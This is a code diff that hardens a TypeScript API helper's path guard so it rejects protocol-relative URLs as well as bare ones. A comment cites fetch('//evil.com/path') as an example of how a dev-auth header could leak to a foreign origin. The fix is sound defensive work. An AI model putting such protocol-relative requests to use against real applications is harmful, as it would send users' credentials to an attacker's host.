@@ -21,10 +21,13 @@ export async function apiCall<T = unknown>(
   path: string,
   init: RequestInit = {},
 ): Promise<ApiResponse<T>> {
-  // Path guard: relative paths only. Prevents a future bug where someone
-  // passes an absolute URL and the dev-sub header leaks to another origin.
-  if (!path.startsWith('/')) {
-    throw new Error(`apiCall: path must start with '/' (got ${JSON.stringify(path)})`)
+  // Path guard: relative paths only. Rejects bare URLs (no leading '/')
+  // AND protocol-relative URLs (leading '//'). The latter is critical:
+  // fetch('//evil.com/path') resolves against the page origin's scheme
+  // (becoming https://evil.com/path) and would leak the x-mythrun-dev-sub
+  // header to a foreign origin.
+  if (!path.startsWith('/') || path.startsWith('//')) {
+    throw new Error(`apiCall: path must be relative and not protocol-relative (got ${JSON.stringify(path)})`)
   }
 
   const start = performance.now()
